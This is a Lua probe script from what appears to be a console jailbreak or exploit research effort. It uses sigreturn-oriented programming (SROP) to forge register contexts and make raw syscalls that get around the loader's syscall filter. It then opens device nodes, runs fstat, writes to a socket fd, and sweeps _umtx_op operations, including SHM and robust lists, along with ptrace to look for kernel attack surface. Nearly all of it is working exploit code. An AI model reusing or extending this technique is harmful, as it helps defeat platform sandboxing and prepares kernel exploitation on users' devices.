-- CRASH_CLASS: MODERATE
-- PROBE 130d: SROP open/read + umtx deep ops
--
-- With SROP we bypass BOTH the Lua resolver AND the loader's C dispatch.
-- Test if open(5)/read(3)/write(4) work — these may have been blocked
-- by the loader but not the kernel. Also test _umtx_op(454) operations
-- that were never exercised: SHM(25), ROBUST_LISTS(26).

print("=== PROBE 130d: SROP OPEN/READ + UMTX OPS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function write_str(buf, s)
    for i = 1, #s do pcall(function() memory.write_byte(buf+i-1, string.byte(s,i)) end) end
    pcall(function() memory.write_byte(buf+#s, 0) end)
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local pid = to_num(sc20())
print("[0] pid=" .. pid)

local MC = 0x40
local RAX = MC + 0x38
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local R8  = MC + 0x28
local R9  = MC + 0x30
local R10 = MC + 0x50
local RIP = MC + 0xA0
local CTX_SIZE = 0x500

local function srop(num, a1, a2, a3, a4, a5)
    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    pcall(function() return sc_getcontext(uint64(ctx)) end)
    local rip_val = rq(ctx + RIP)
    local rh, rl = get_hi_lo(rip_val)
    wq(ctx + RIP, uint64(string.format("0x%X%08X", rh, rl - 2)))
    wq(ctx + RAX, uint64(num))
    if a1 then wq(ctx + RDI, a1) end
    if a2 then wq(ctx + RSI, a2) end
    if a3 then wq(ctx + RDX, a3) end
    if a4 then wq(ctx + R10, a4) end
    if a5 then wq(ctx + R8, a5) end
    local ok, rv = pcall(function() return sc_sigreturn(uint64(ctx)) end)
    return rv, ok
end

local sc_mmap = make_syscall(477)
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(32 * 0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))

--------------------------------------------------------------------
-- SECTION A: open(5) various paths
--------------------------------------------------------------------
print("")
print("--- SECTION A: open(5) via SROP ---")

local paths = {
    "/dev/null",
    "/dev/zero",
    "/dev/random",
    "/dev/urandom",
    "/dev/console",
    "/dev/deci_tty8",
    "/dev/notification0",
    "/dev/dmpctl",
    "/dev/hid",
    "/dev/bpf",
    "/dev/pf",
    "/proc/curproc/status",
}

for _, p in ipairs(paths) do
    local pbuf = gpu + 0x100
    write_str(pbuf, p)
    local rv = srop(5, pbuf, uint64(0))  -- O_RDONLY=0
    local rh, rl = get_hi_lo(rv)
    local status = "FAIL"
    if rl < 0x8000 and rh == 0 then status = "fd=" .. rl end
    print("  open(\"" .. p .. "\"): rv=" .. hex(rv) .. " " .. status)
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: fstat(189) on known fds
--------------------------------------------------------------------
print("")
print("--- SECTION B: fstat(189) on fds ---")

local stat_buf = gpu + 0x200
for fd = 0, 10 do
    zero(stat_buf, 0x100)
    local rv = srop(189, uint64(fd), stat_buf)
    local rh, rl = get_hi_lo(rv)
    if rl == 0 and rh == 0 then
        local dev = rq(stat_buf + 0)
        local ino = rq(stat_buf + 8)
        local mode = rd(stat_buf + 0x18)
        local size = rq(stat_buf + 0x48)
        print("  fd=" .. fd .. ": dev=" .. hex(dev) .. " ino=" .. hex(ino) .. " mode=" .. string.format("0%o", mode or 0) .. " size=" .. hex(size))
    else
        print("  fd=" .. fd .. ": rv=" .. hex(rv) .. " (bad fd)")
    end
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: read(3) from /dev/random if open worked
--------------------------------------------------------------------
print("")
print("--- SECTION C: read from fds ---")

-- Try reading 16 bytes from fd=4 (TCP socket)
local read_buf = gpu + 0x800
zero(read_buf, 0x100)

-- Try write(4) to fd 4 (TCP socket) — send data back
print("  testing write(4) to fd=4...")
local msg_buf = gpu + 0x900
write_str(msg_buf, "[SROP_WRITE_TEST]\n")
local rv_wr = srop(4, uint64(4), msg_buf, uint64(19))
print("  write(4,4): rv=" .. hex(rv_wr))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: _umtx_op(454) — SHM (op=25)
-- Creates shared memory keyed to a userland address
--------------------------------------------------------------------
print("")
print("--- SECTION D: _umtx_op(454) SHM ---")

-- _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)
-- SHM(25): obj=key_addr, val=SHM_OP (0=create, 1=lookup, 2=destroy, 3=exists)
local shm_key = gpu + 0xA00
wd(shm_key, 0)

-- Create SHM
local rv_shm = srop(454, shm_key, uint64(25), uint64(0))  -- val=0 create
print("  SHM create: rv=" .. hex(rv_shm))
local rh_s, rl_s = get_hi_lo(rv_shm)
if rl_s == 0 and rh_s == 0 then
    print("  SHM CREATE SUCCESS!")

    -- Lookup SHM
    local rv_lk = srop(454, shm_key, uint64(25), uint64(1))
    print("  SHM lookup: rv=" .. hex(rv_lk))

    -- Get the fd
    local rv_ex = srop(454, shm_key, uint64(25), uint64(3))
    print("  SHM exists: rv=" .. hex(rv_ex))

    -- Read what's at the key addr
    print("  key value=" .. hex(rq(shm_key)))
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: _umtx_op(454) — ROBUST_LISTS (op=26)
-- Sets the robust futex list head pointer
--------------------------------------------------------------------
print("")
print("--- SECTION E: _umtx_op(454) ROBUST_LISTS ---")

-- op=26: uaddr1 = pointer to struct umtx_robust_lists_params
local robust_params = gpu + 0xB00
zero(robust_params, 0x30)
-- struct umtx_robust_lists_params { size_t robust_list_offset; void *robust_priv_list; void *robust_inact_list; }
wq(robust_params, uint64(0x18))       -- robust_list_offset (size of header)
wq(robust_params + 8, gpu + 0xC00)    -- robust_priv_list (our controlled memory)
wq(robust_params + 0x10, uint64(0))   -- robust_inact_list

local rv_rob = srop(454, uint64(0), uint64(26), uint64(0x18), robust_params)
print("  ROBUST_LISTS: rv=" .. hex(rv_rob))
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION F: _umtx_op(454) — various ops sweep 0-10
--------------------------------------------------------------------
print("")
print("--- SECTION F: _umtx_op(454) op sweep 0-10 ---")

local umtx_obj = gpu + 0xD00
zero(umtx_obj, 0x40)

for op = 0, 10 do
    zero(umtx_obj, 0x40)
    local rv = srop(454, umtx_obj, uint64(op), uint64(0))
    local rh_o, rl_o = get_hi_lo(rv)
    local status = "FAIL"
    if rl_o == 0 and rh_o == 0 then status = "OK" end
    print("  op=" .. op .. " rv=" .. hex(rv) .. " " .. status .. " obj[0]=" .. hex(rq(umtx_obj)))
end
print("[alive] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION G: Try ptrace(26) on self
--------------------------------------------------------------------
print("")
print("--- SECTION G: ptrace(26) PT_TRACE_ME ---")
-- PT_TRACE_ME = 0
local rv_pt = srop(26, uint64(0), uint64(0), uint64(0), uint64(0))
print("  ptrace(PT_TRACE_ME): rv=" .. hex(rv_pt))
print("[alive] pid=" .. to_num(sc20()))

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 130d COMPLETE ===")
